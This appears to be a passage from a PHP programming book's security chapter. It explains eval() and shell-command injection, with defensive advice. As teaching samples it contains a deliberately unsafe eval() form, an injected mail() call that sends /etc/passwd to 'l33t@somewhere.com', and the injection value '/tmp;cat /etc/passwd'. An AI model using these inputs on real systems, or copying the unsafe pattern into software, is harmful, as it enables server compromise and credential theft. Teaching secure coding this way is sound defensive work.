<section data-type="sect2" data-pdf-bookmark="PHP Code Issues"><div class="sect2" id="php_code_issues">
<h2>PHP Code Issues</h2>
<p><a contenteditable="false" data-type="indexterm" data-primary="program execution" data-secondary="security issues" id="ix_execution_security"/><a contenteditable="false" data-type="indexterm" data-primary="eval function" id="ix_eval_function_security"/><a contenteditable="false" data-type="indexterm" data-primary="PHP" data-secondary="security issues for code" id="ix_php_code_security"/><a contenteditable="false" data-type="indexterm" data-primary="security" data-secondary="PHP code evaluation" id="ix_security_php_eval"/>With the <code>eval()</code> function, PHP allows a script to execute arbitrary PHP code. Although it can be useful in a few limited cases, allowing any user-supplied data to go into an <code>eval()</code> call is just begging to be hacked. For instance, the following code is a security nightmare:</p>
<pre data-type="programlisting" data-code-language="html+php"><code class="nt">&lt;html&gt;</code>
 <code class="nt">&lt;head&gt;</code>
 <code class="nt">&lt;title&gt;</code>Here are the keys...<code class="nt">&lt;/title&gt;</code>
 <code class="nt">&lt;/head&gt;</code>

 <code class="nt">&lt;body&gt;</code>
 <code class="cp">&lt;?php</code> <code class="k">if</code> <code class="p">(</code><code class="nv">$_REQUEST</code><code class="p">[</code><code class="s1">'code'</code><code class="p">])</code> <code class="p">{</code>
 <code class="k">echo</code> <code class="s2">"Executing code..."</code><code class="p">;</code>

 <code class="k">eval</code><code class="p">(</code><code class="nb">stripslashes</code><code class="p">(</code><code class="nv">$_REQUEST</code><code class="p">[</code><code class="s1">'code'</code><code class="p">]));</code> <code class="c1">// BAD!</code>
 <code class="p">}</code> <code class="cp">?&gt;</code>

 <code class="nt">&lt;form</code> <code class="na">action=</code><code class="s">"</code><code class="cp">&lt;?php</code> <code class="k">echo</code> <code class="nv">$_SERVER</code><code class="p">[</code><code class="s1">'PHP_SELF'</code><code class="p">];</code> <code class="cp">?&gt;</code><code class="s">"</code><code class="nt">&gt;</code>
 <code class="nt">&lt;input</code> <code class="na">type=</code><code class="s">"text"</code> <code class="na">name=</code><code class="s">"code"</code> <code class="nt">/&gt;</code>
 <code class="nt">&lt;input</code> <code class="na">type=</code><code class="s">"submit"</code> <code class="na">name=</code><code class="s">"Execute Code"</code> <code class="nt">/&gt;</code>
 <code class="nt">&lt;/form&gt;</code>
 <code class="nt">&lt;/body&gt;</code>
<code class="nt">&lt;/html&gt;</code></pre>
<p>This page takes some arbitrary PHP code from a form and runs it as part of the script. The running code has access to all of the global variables for, and runs with the same privileges as, the script. It’s not hard to see why this is a problem. Type this into the form:</p>
<pre data-type="programlisting" data-code-language="php"><code class="k">include</code><code class="p">(</code><code class="s2">"/etc/passwd"</code><code class="p">);</code></pre>
<p>Never do this. There is no practical way to ensure such a script can ever be secure.</p>
<p>You can globally disable particular function calls by listing them, separated by commas, in the <a contenteditable="false" data-type="indexterm" data-primary="php.ini file" data-secondary="disable_functions option" id="idm45922748615608"/><a contenteditable="false" data-type="indexterm" data-primary="disable_functions option, php.ini file" id="idm45922748613992"/><code>disable_functions</code> configuration option in <em>php.ini</em>. For example, you may never have need for the <code>system()</code> function, so you can disable it entirely with:</p>
<pre data-type="programlisting" data-code-language="ini"><code class="na">disable_functions</code> <code class="o">=</code> <code class="s">system</code></pre>
<p>This doesn’t make <code>eval()</code> any safer, though, as there’s no way to prevent important variables from being changed or built-in constructs such as <code>echo()</code> from being called.</p>
<p>In the case of <code>include</code>, <code>require</code>, <code>include_once</code>, and <code>require_once</code>, your best bet is to turn off remote file access using <a contenteditable="false" data-type="indexterm" data-primary="allow_url_fopen option, php.ini file" id="idm45922748592488"/><a contenteditable="false" data-type="indexterm" data-primary="php.ini file" data-secondary="allow_url_fopen option" id="idm45922748591528"/><code>allow_url_fopen</code>.</p>
<p>Any use of <code>eval()</code> and the <code>/e</code> option with <a contenteditable="false" data-type="indexterm" data-primary="preg_replace function" id="idm45922748605736"/><code>preg_replace()</code> is dangerous, especially if you use any user-entered data in the calls. Consider the following:</p>
<pre data-type="programlisting" data-code-language="php"><code class="k">eval</code><code class="p">(</code><code class="s2">"2 + </code><code class="si">{</code><code class="nv">$userInput</code><code class="si">}</code><code class="s2">"</code><code class="p">);</code></pre>
<p>It seems pretty innocuous. However, suppose the user enters the following value:</p>
<pre data-type="programlisting" data-code-language="php"><code class="mi">2</code><code class="p">;</code> <code class="nb">mail</code><code class="p">(</code><code class="s2">"l33t@somewhere.com"</code><code class="p">,</code> <code class="s2">"Some passwords"</code><code class="p">,</code> <code class="s2">"/bin/cat /etc/passwd"</code><code class="p">);</code></pre>
<p>In this case, both the expected command and the one you’d rather avoid will be executed. The only viable solution is to never give user-supplied data to <code>eval()</code>.<a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_eval_function_security" id="idm45922748570664"/><a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_security_php_eval" id="idm45922748569416"/><a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_php_code_security" id="idm45922748568040"/><a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_execution_security" id="idm45922748566664"/></p>
</div></section>
<section data-type="sect2" data-pdf-bookmark="Shell Command Weaknesses"><div class="sect2" id="shell_command_weaknesses">
<h2>Shell Command Weaknesses</h2>
<p><a contenteditable="false" data-type="indexterm" data-primary="security" data-secondary="shell commands" id="idm45922748510008"/><a contenteditable="false" data-type="indexterm" data-primary="shell commands" data-secondary="security issues" id="idm45922748508408"/>Be very wary of using the <a contenteditable="false" data-type="indexterm" data-primary="exec function" id="idm45922748506904"/><code>exec()</code>, <a contenteditable="false" data-type="indexterm" data-primary="system function" id="idm45922748505384"/><code>system()</code>, <a contenteditable="false" data-type="indexterm" data-primary="passthru function" id="idm45922748503832"/><code>passthru()</code>, and <a contenteditable="false" data-type="indexterm" data-primary="popen function" id="idm45922748502280"/><code>popen()</code> functions and the <a contenteditable="false" data-type="indexterm" data-primary="`…` (backticks), execution operator" id="idm45922748500728"/><a contenteditable="false" data-type="indexterm" data-primary="backticks (`…`), execution operator" id="idm45922748499624"/>backtick operator (<code>`</code>) in your code. The shell is a problem because it recognizes special characters (e.g., semicolons to separate commands). For example, suppose your script contains this line:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nb">system</code><code class="p">(</code><code class="s2">"ls </code><code class="si">{</code><code class="nv">$directory</code><code class="si">}</code><code class="s2">"</code><code class="p">);</code></pre>
<p>If the user passes the value <code>"/tmp;cat /etc/passwd"</code> as the <code>$directory</code> parameter, your password file is displayed because <code>system()</code> executes the following command:</p>
<pre data-type="programlisting">ls /tmp;cat /etc/passwd</pre>
<p>In cases where you must pass user-supplied arguments to a shell command, use <a contenteditable="false" data-type="indexterm" data-primary="escapeshellarg function" id="idm45922748443240"/><code>escapeshellarg()</code> on the string to escape any sequences that have special meaning to shells:</p>
<pre data-type="programlisting" data-code-language="php"><code class="nv">$cleanedArg</code> <code class="o">=</code> <code class="nb">escapeshellarg</code><code class="p">(</code><code class="nv">$directory</code><code class="p">);</code>
<code class="nb">system</code><code class="p">(</code><code class="s2">"ls </code><code class="si">{</code><code class="nv">$cleanedArg</code><code class="si">}</code><code class="s2">"</code><code class="p">);</code></pre>
<p>Now, if the user passes <code>"/tmp;cat /etc/passwd"</code>, the command that’s actually run is:</p>
<pre data-type="programlisting">ls '/tmp;cat /etc/passwd'</pre>
<p>The easiest way to avoid the shell is to do the work of whatever program you’re trying to call in PHP code, rather than calling out to the shell. Built-in functions are likely to be more secure than anything involving the shell.</p>
</div></section>
<section data-type="sect2" data-pdf-bookmark="Data Encryption Concerns"><div class="sect2" id="data_encryption_concerns">
<h2>Data Encryption Concerns</h2>
<p><a contenteditable="false" data-type="indexterm" data-primary="security" data-secondary="data encryption considerations" id="idm45922748471960"/><a contenteditable="false" data-type="indexterm" data-primary="encryption of data" id="idm45922748470520"/>One last topic to cover is encrypting data that you want to ensure is not viewable in its native form. This mostly applies to website passwords, but there are other examples, such as Social Security numbers (Social Insurance numbers in Canada), credit card numbers, and bank account numbers.</p>
<p>Check out the discussion on <a href="https://oreil.ly/3wh7t">the FAQ page of the PHP website</a> to find the best approach for your specific data encryption needs.</p>
</div></section>
</div></section>
<section data-type="sect1" data-pdf-bookmark="Further Resources"><div class="sect1" id="further_resources">
<h1>Further Resources</h1>
<p><a contenteditable="false" data-type="indexterm" data-primary="website resources" data-secondary="security" id="idm45922748377784"/>The following resources can help you expand on this brief introduction to code <span class="keep-together">security:</span></p>
<ul>
<li><p><a class="orm:hideurl" href="https://oreil.ly/PHP_Security"><em>Essential PHP Security</em></a> (O’Reilly) by Chris Shiflett <a contenteditable="false" data-type="indexterm" data-primary="Essential PHP Security (O'Reilly)" id="idm45922748373672"/><a contenteditable="false" data-type="indexterm" data-primary="Shiflett, Chris (author)" data-secondary="Essential PHP Security (O'Reilly)" id="idm45922748372536"/>and its <a href="http://phpsecurity.org">companion website</a></p></li>
<li><p><a contenteditable="false" data-type="indexterm" data-primary="website resources" data-secondary="Open Web Application Security Project" id="idm45922748369992"/><a contenteditable="false" data-type="indexterm" data-primary="Open Web Application Security Project" id="idm45922748368600"/>The <a href="https://www.owasp.org">Open Web Application Security Project</a></p></li>
</ul>
</div></section>
<section data-type="sect1" data-pdf-bookmark="Security Recap"><div class="sect1" id="security_recap">
<h1>Security Recap</h1>
<p>Because security is such an important issue, we want to reiterate the main points of this chapter as well as provide a few additional tips:</p>
<ul>
<li><p>Filter input to be sure that all data you receive from remote sources is the data you expect. Remember, the stricter your filtering logic, the safer your application.</p></li>
<li><p>Escape output in a context-aware manner to be sure that your data isn’t misinterpreted by a remote system.</p></li>
<li><p>Always initialize your variables. This is especially important when the <a contenteditable="false" data-type="indexterm" data-primary="register_globals option, php.ini file" id="idm45922748348952"/><a contenteditable="false" data-type="indexterm" data-primary="php.ini file" data-secondary="register_globals option" id="idm45922748347848"/><span class="keep-together"><code>register_globals</code></span> directive is enabled.</p></li>
<li><p>Disable <code>register_globals</code>, <code>magic_quotes_gpc</code>, and <code>allow_url_fopen</code>. See the <a href="http://www.php.net">PHP website</a> for details on these directives.</p></li>
<li><p>Whenever you construct a filename, check the components with <code>basename()</code> and <code>realpath()</code>.</p></li>
<li><p>Store include files outside of the document root. It is better to not name your include files with the <em>.inc</em> extension. Name them with a <em>.php</em> extension, or some other less obvious extension.</p></li>
<li><p>Always call <code>session_regenerate_id()</code> whenever a user’s privilege level changes.</p></li>
<li><p>Whenever you construct a filename from a user-supplied component, check the components with <code>basename()</code> and <code>realpath()</code>.</p></li>
<li><p>Don’t create a file and then change its permissions. Instead, set <code>umask()</code> so that the file is created with the correct permissions.</p></li>
<li><p>Don’t use user-supplied data with <code>eval()</code>, <code>preg_replace()</code> with the <code>/e</code> option, or any of the system commands—<code>exec()</code>, <code>system()</code>, <code>popen()</code>, <code>passthru()</code>, and the backtick operator (<code>`</code>).<a contenteditable="false" data-type="indexterm" data-primary="" data-startref="ix_security_ch14" id="idm45922748332104"/></p></li>
</ul>
</div></section>
<section data-type="sect1" data-pdf-bookmark="What’s Next"><div class="sect1" id="whatapostrophes_next-id00072">
<h1>What’s Next</h1>
<p>With potential vulnerabilities like these, you might be wondering why you should do this “web development thing” at all. There are almost daily reports of web security breaches at banks and investment houses with massive data loss and identity theft. At the very least, if you are going to become a good web developer you <em>must</em> always embrace security and keep in mind that it is a changing landscape. Don’t ever assume that you are 100% secure.</p>
<p>Coming in the next chapter is a discussion on application development techniques. This is another area where web developers can really shine and save themselves a lot of headaches. The use of code libraries, error handling, and performance tuning are among the topics we’ll cover.</p>
</div></section>
</div></section></div>



  </body></html>